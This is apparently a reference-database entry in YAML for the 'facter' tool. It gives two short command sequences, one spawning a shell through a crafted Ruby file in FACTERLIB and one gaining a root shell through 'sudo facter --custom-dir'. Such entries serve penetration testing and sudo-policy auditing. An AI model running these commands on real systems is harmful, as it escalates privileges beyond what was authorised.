---
functions:
  shell:
    - code: |
        TF=$(mktemp -d)
        echo 'exec("/bin/sh")' > $TF/x.rb
        FACTERLIB=$TF facter
  sudo:
    - code: |
        TF=$(mktemp -d)
        echo 'exec("/bin/sh")' > $TF/x.rb
        sudo facter --custom-dir=$TF x
---
